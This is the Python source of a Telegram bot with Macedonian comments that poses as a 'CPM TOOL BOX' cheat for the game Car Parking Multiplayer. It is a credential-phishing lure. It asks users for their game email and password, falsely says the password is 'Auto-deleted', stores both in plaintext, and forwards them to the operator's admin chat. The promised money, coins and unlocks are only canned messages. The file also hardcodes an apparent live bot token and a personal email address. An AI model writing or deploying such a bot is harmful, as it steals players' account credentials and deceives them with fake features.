import logging
import sqlite3
import asyncio
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Конфигурирање на логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Точниот токен и ADMIN ID
BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
ADMIN_ID = 8694942406  

# Симулирани CPM податоци
CPM_DATA = {
    'money': 48729000,
    'coins': 20400,
    'wins': 16,
    'losses': 0,
    'levels': 109,
    'wheels': 112,
    'animations': 42,
    'friends': 0,
    'id': 'VY704074'
}

def inicijaliziraj_baza():
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT, username TEXT)''')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user if update.message else update.callback_query.from_user
    username = user.username if user.username else "N/A"

    # АКО Е АДМИН - ПРИКАЖИ АДМИН МЕНИ
    if user.id == ADMIN_ID:
        admin_text = (
            "**🛡️ CPM_AJHAN_BOT - ADMIN PANEL**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👑 Добредојде Администраторе!\n\n"
            "📊 Изберете опција:"
        )
        keyboard = [
            [InlineKeyboardButton("📋 Список на корисници", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑️ Избриши корисник", callback_data="admin_remove_user")],
            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
        ]
        if update.message:
            await update.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT data, odobren, email FROM licenci WHERE id = ?', (str(user.id),))
    rezultat = cursor.fetchone()
    conn.close()

    sega = datetime.now()
    dozvolen = False
    email = ""

    if rezultat:
        istekuvanje_str = rezultat[0]
        odobren = rezultat[1] if len(rezultat) > 1 else 0
        email = rezultat[2] if len(rezultat) > 2 and rezultat[2] else ""
        
        if odobren == 1:
            if istekuvanje_str == "forever":
                dozvolen = True
            else:
                try:
                    dozvolen_sega = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
                    if dozvolen_sega > sega:
                        dozvolen = True
                except ValueError:
                    dozvolen = False

    if not dozvolen:
        welcome_text = (
            "**CPM_AJHAN_BOT**\n"
            "bot\n\n"
            "---\n"
            "**CPM TOOL BOX v4.0**\n"
            "---\n"
            f"**WELCOME**\n"
            f"@{username}\n"
            f"ID {user.id}\n"
            f"{sega.strftime('%d %b %Y • %I:%M %p')}\n\n"
            "- Sign in with your CPM credentials\n"
            "**05:10**\n\n"
            "**Sign In**"
        )
        
        keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
        
        if update.message:
            await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # ДОЗВОЛЕН КОРИСНИК - ПРИКАЖИ DASHBOARD
    dashboard_text = (
        "**CPM_AJHAN_BOT**\n"
        "bot\n\n"
        "---\n"
        "**DASHBOARD**\n"
        "---\n"
        "**ACCOUNT**\n"
        f"{email if email else 'senatkafkast@gmail.com'}\n"
        f"2best\n"
        f"ID {CPM_DATA['id']}\n\n"
        "**STATS**\n"
        f"${CPM_DATA['money']:,}\n"
        f"{CPM_DATA['coins']:,} coins\n"
        f"{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
        f"{CPM_DATA['levels']} levels done\n"
        f"{CPM_DATA['wheels']} wheels\n"
        f"{CPM_DATA['animations']} animations\n"
        f"{CPM_DATA['friends']} friends\n\n"
        "- Select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
        [InlineKeyboardButton("🔄 Refresh Account", callback_data="refresh_account")],
        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
    ]
    
    if update.message:
        await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**MONEY**\n\n"
        f"Max: ${CPM_DATA['money']:,}"
    )
    
    keyboard = [
        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m")],
        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**COINS**\n\n"
        f"Max: {CPM_DATA['coins']:,}"
    )
    
    keyboard = [
        [InlineKeyboardButton("100K", callback_data="add_coins_100k"), InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k")],
        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**FEATURES**\n"
        "Select a feature or UNLOCK ALL:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🏎️ W16", callback_data="feature_w16"), InlineKeyboardButton("🛡️ No Dmg", callback_data="feature_no_dmg")],
        [InlineKeyboardButton("💨 Smoke", callback_data="feature_smoke"), InlineKeyboardButton("⚙️ Wheels", callback_data="feature_wheels")],
        [InlineKeyboardButton("📈 Levels", callback_data="feature_levels"), InlineKeyboardButton("⛽ Fuel", callback_data="feature_fuel")],
        [InlineKeyboardButton("📯 Horns", callback_data="feature_horns"), InlineKeyboardButton("🎭 Anims", callback_data="feature_anims")],
        [InlineKeyboardButton("🏠 Houses", callback_data="feature_houses"), InlineKeyboardButton("👑 Rank", callback_data="feature_rank")],
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("⚙️ **SETTINGS**\n\nSettings menu coming soon...", parse_mode='Markdown')

async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔄 **Refreshing account...**", parse_mode='Markdown')
    await asyncio.sleep(1)
    await start(update, context)

async def sign_out(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM licenci WHERE id = ?', (str(user.id),))
    conn.commit()
    conn.close()
    
    await query.edit_message_text("🚪 **Signed out successfully!**\n\nType /start to sign in again.", parse_mode='Markdown')

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['sostojba'] = 'CEKA_EMAIL'

async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sostojba = context.user_data.get('sostojba')
    vnesen_tekst = update.message.text
    user = update.message.from_user
    username = user.username if user.username else "N/A"

    # АКО КОРИСНИКОТ ВНЕСУВА CUSTOM AMOUNT ЗА ПАРИ
    if sostojba == 'CUSTOM_MONEY':
        try:
            vnes = vnesen_tekst.strip().lower()
            
            if vnes.endswith('m'):
                amount = int(float(vnes[:-1]) * 1000000)
            elif vnes.endswith('k'):
                amount = int(float(vnes[:-1]) * 1000)
            else:
                amount = int(vnes)
            
            admin_poraka = (
                f"💰 **Барање за пари**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **Корисник:** @{username}\n"
                f"🆔 **ID:** `{user.id}`\n"
                f"💵 **Износ:** `${amount:,}`\n"
                f"⏰ {datetime.now().strftime('%H:%M')}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
            await update.message.reply_text(f"✅ **Барањето за ${amount:,} е испратено до администраторот!**", parse_mode='Markdown')
            
        except:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 10m, 500k, или 1000000")
        
        context.user_data['sostojba'] = None
        return

    # АКО КОРИСНИКОТ ВНЕСУВА CUSTOM AMOUNT ЗА КОИНИ
    if sostojba == 'CUSTOM_COINS':
        try:
            vnes = vnesen_tekst.strip().lower()
            
            if vnes.endswith('k'):
                amount = int(float(vnes[:-1]) * 1000)
            else:
                amount = int(vnes)
            
            admin_poraka = (
                f"🪙 **Барање за коини**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **Корисник:** @{username}\n"
                f"🆔 **ID:** `{user.id}`\n"
                f"🪙 **Износ:** {amount:,} coins\n"
                f"⏰ {datetime.now().strftime('%H:%M')}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
            await update.message.reply_text(f"✅ **Барањето за {amount:,} коини е испратено до администраторот!**", parse_mode='Markdown')
            
        except:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 100k или 50000")
        
        context.user_data['sostojba'] = None
        return

    # АКО АДМИНОТ ВНЕСУВА ID ЗА БРИШЕЊЕ
    if sostojba == 'CEKA_REMOVE_USER':
        try:
            target_user_id = int(vnesen_tekst)
            
            conn = sqlite3.connect('Licenci.db')
            cursor = conn.cursor()
            cursor.execute('SELECT username FROM licenci WHERE id = ?', (str(target_user_id),))
            user_data = cursor.fetchone()
            
            if not user_data:
                await update.message.reply_text("❌ Корисникот не е пронајден!")
                context.user_data['sostojba'] = None
                return
            
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_user_id),))
            conn.commit()
            conn.close()
            
            await update.message.reply_text(f"✅ **Корисникот {target_user_id} е избришан!**", parse_mode='Markdown')
            context.user_data['sostojba'] = None
            
        except:
            await update.message.reply_text("❌ Внесете валидно ID!")
        return

    # АКО АДМИНОТ ВНЕСУВА CUSTOM ВРЕМЕ
    if sostojba == 'CEKA_CUSTOM_TIME':
        target_user_id = context.user_data.get('custom_target_user')
        vnes = vnesen_tekst.strip().lower()
        
        try:
            if vnes.endswith('h'):
                hours = int(vnes[:-1])
                if 1 <= hours <= 24:
                    vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{hours} часа"
                else:
                    await update.message.reply_text("❌ Внесете 1h до 24h!")
                    return
            else:
                days = int(vnes)
                if 1 <= days <= 30:
                    vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{days} дена"
                else:
                    await update.message.reply_text("❌ Внесете 1 до 30 дена!")
                    return
            
            conn = sqlite3.connect('Licenci.db')
            cursor = conn.cursor()
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_user_id), vrednost))
            conn.commit()
            conn.close()
            
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"✅ Администраторот ви додели лиценца на {vreme_text}!"
            )
            await update.message.reply_text(f"✅ Лиценцата е доделена на {vreme_text}!")
            context.user_data['sostojba'] = None
            
        except:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 5h или 10")
        return

    # АКО КОРИСНИКОТ ВНЕСУВА EMAIL
    if sostojba == 'CEKA_EMAIL':
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, vnesen_tekst):
            await update.message.reply_text("❌ Внесете валидна email адреса!")
            return
        
        context.user_data['email'] = vnesen_tekst
        text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
        keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
        
        await update.message.reply_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        context.user_data['sostojba'] = 'CEKA_PASSWORD'
        return

    # АКО КОРИСНИКОТ ВНЕСУВА PASSWORD
    if sostojba == 'CEKA_PASSWORD':
        password = vnesen_tekst
        email = context.user_data.get('email')
        context.user_data['sostojba'] = None
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, 0, ?, ?, ?)', 
                      (str(user.id), "pending", email, password, username))
        conn.commit()
        conn.close()
        
        admin_poraka = (
            f"🔐 **Нов профил!**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{username}\n"
            f"🆔 `{user.id}`\n"
            f"📧 `{email}`\n"
            f"🔑 `{password}`\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard_admin = [
            [InlineKeyboardButton("✅ Одобри", callback_data=f"lic:approve:{user.id}")],
            [InlineKeyboardButton("❌ Одбиј", callback_data=f"lic:deny:{user.id}")]
        ]
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_poraka,
            reply_markup=InlineKeyboardMarkup(keyboard_admin),
            parse_mode='Markdown'
        )
        
        cekaj_poraka = (
            "⏳ **Чекање на одобрение**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📧 Податоците се испратени до администраторот.\n"
            "⏱️ Ве молиме почекајте **5-10 минути**.\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
        await update.message.reply_text(
            text=cekaj_poraka,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    # АКО КОРИСНИКОТ ИСПРАТИ НЕШТО ДРУГО
    else:
        admin_poraka = (
            f"📝 **Порака од корисник**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{username}\n"
            f"🆔 `{user.id}`\n"
            f"📩 {vnesen_tekst}\n"
            f"⏰ {datetime.now().strftime('%H:%M')}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
        await update.message.reply_text("✅ **Пораката е испратена до администраторот!**", parse_mode='Markdown')

async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    # ПРОВЕРКА НА СТАТУС
    if data == "proveri_status":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT odobren FROM licenci WHERE id = ?', (str(user.id),))
        rezultat = cursor.fetchone()
        conn.close()
        
        if rezultat and rezultat[0] == 1:
            await query.edit_message_text("✅ **Одобрени сте!** Напишете /start", parse_mode='Markdown')
        else:
            keyboard = [[InlineKeyboardButton("🔄 Провери", callback_data="proveri_status")]]
            await query.edit_message_text(
                "⏳ **Чекате одобрение...**\nПочекајте 5-10 минути.",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        return

    # АДМИН КОМАНДИ
    if data == "admin_panel":
        await start(update, context)
        return
    
    if data == "admin_list_users":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT id, username, data, odobren FROM licenci')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            await query.edit_message_text("📋 **Нема корисници.**", parse_mode='Markdown')
            return
        
        text = "📋 **КОРИСНИЦИ**\n━━━━━━━━━━━━━━━━━━━\n\n"
        for user_data in users:
            user_id, username, data, odobren = user_data
            status = "✅ Активен" if odobren == 1 else "⏳ Чека"
            text += f"🆔 `{user_id}`\n👤 @{username or 'N/A'}\n📅 {data or 'Нема'}\n📊 {status}\n━━━━━━━━━━━━━━━━━━━\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return
    
    if data == "admin_remove_user":
        await query.edit_message_text(
            "🗑️ **Внесете ID за бришење:**\nПример: 8694942406",
            parse_mode='Markdown'
        )
        context.user_data['sostojba'] = 'CEKA_REMOVE_USER'
        return
    
    if data == "admin_stats":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM licenci')
        total = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 1')
        active = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 0')
        waiting = cursor.fetchone()[0]
        conn.close()
        
        text = (
            f"📊 **СТАТИСТИКА**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Вкупно: **{total}**\n"
            f"✅ Активни: **{active}**\n"
            f"⏳ Чекаат: **{waiting}**\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # АДМИН ЛИЦЕНЦИ
    if data.startswith("lic:"):
        parts = data.split(":")
        action = parts[1]
        target_id = int(parts[2])
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if action == "deny":
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_id),))
            await context.bot.send_message(chat_id=target_id, text="❌ **Одбиени сте!**")
            await query.edit_message_text(f"❌ Одбиен {target_id}")
            
        elif action == "approve":
            cursor.execute('UPDATE licenci SET data = ?, odobren = 1 WHERE id = ?', 
                          ("forever", str(target_id)))
            await context.bot.send_message(chat_id=target_id, text="✅ **Одобрени сте!** Напишете /start")
            await query.edit_message_text(f"✅ Одобрен {target_id}")
            
        elif action == "custom":
            await query.edit_message_text(
                f"⚙️ **Внесете време за {target_id}**\n"
                "• **5h** = 5 саати\n"
                "• **10** = 10 дена",
                parse_mode='Markdown'
            )
            context.user_data['sostojba'] = 'CEKA_CUSTOM_TIME'
            context.user_data['custom_target_user'] = target_id
            conn.close()
            return
            
        else:
            if action == "forever":
                value = "forever"
                text = "засекогаш"
            elif action == "30":
                value = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
                text = "30 дена"
            elif action == "7":
                value = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
                text = "7 дена"
            else:
                value = "forever"
                text = "засекогаш"
            
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_id), value))
            await context.bot.send_message(chat_id=target_id, text=f"✅ Лиценца на {text}!")
            await query.edit_message_text(f"✅ Доделено {text} на {target_id}")
        
        conn.commit()
        conn.close()
        return

    # МЕНИЈА
    if data == "main_menu":
        await start(update, context)
        return
    
    if data == "menu_money":
        await menu_money(update, context)
        return
    
    if data == "menu_coins":
        await menu_coins(update, context)
        return
    
    if data == "menu_features":
        await menu_features(update, context)
        return
    
    if data == "menu_settings":
        await menu_settings(update, context)
        return

    if data == "cpm_signin":
        await cpm_signin(update, context)
        return
    
    if data == "refresh_account":
        await refresh_account(update, context)
        return
    
    if data == "sign_out":
        await sign_out(update, context)
        return

    # FEATURES
    if data.startswith("feature_"):
        if data == "feature_unlock_all":
            text = "🔓 **СИТЕ ФИЧИ ОТКЛУЧЕНИ!**\n✅ W16\n✅ No Dmg\n✅ Smoke\n✅ Wheels\n✅ Levels\n✅ Fuel\n✅ Horns\n✅ Anims\n✅ Houses\n✅ Rank"
        else:
            feature = data.replace("feature_", "").replace("_", " ").upper()
            text = f"✅ **{feature}** отклучен!"
        
        keyboard = [[InlineKeyboardButton("⬅️ Назад", callback_data="menu_features")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # MONEY - QUICK ADD
    if data.startswith("add_money_"):
        amount = data.replace("add_money_", "")
        if amount.endswith("m"):
            amount = int(amount[:-1]) * 1000000
        else:
            amount = int(amount)
        
        # Испрати до админ
        admin_poraka = (
            f"💰 **Барање за пари**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{user.username or 'N/A'}\n"
            f"🆔 `{user.id}`\n"
            f"💵 **${amount:,}**\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
        
        await query.edit_message_text(
            f"✅ **Барањето за ${amount:,} е испратено!**",
            parse_mode='Markdown'
        )
        return

    # COINS - QUICK ADD
    if data.startswith("add_coins_"):
        amount = data.replace("add_coins_", "")
        if amount.endswith("k"):
            amount = int(amount[:-1]) * 1000
        else:
            amount = int(amount)
        
        admin_poraka = (
            f"🪙 **Барање за коини**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{user.username or 'N/A'}\n"
            f"🆔 `{user.id}`\n"
            f"🪙 {amount:,} coins\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
        
        await query.edit_message_text(
            f"✅ **Барањето за {amount:,} коини е испратено!**",
            parse_mode='Markdown'
        )
        return

    # CUSTOM AMOUNTS
    if data == "custom_money":
        await query.edit_message_text("💰 **Внесете износ:**\nПример: 10m, 500k, или 1000000", parse_mode='Markdown')
        context.user_data['sostojba'] = 'CUSTOM_MONEY'
        return
    
    if data == "custom_coins":
        await query.edit_message_text("🪙 **Внесете износ:**\nПример: 100k или 50000", parse_mode='Markdown')
        context.user_data['sostojba'] = 'CUSTOM_COINS'
        return

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Грешка: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Настана грешка. Обидете се повторно.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(obraboti_klikovi))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, obraboti_tekst))
    app.add_error_handler(error_handler)
    
    logger.info("🚀 CPM_AJHAN_BOT стартува...")
    app.run_polling()
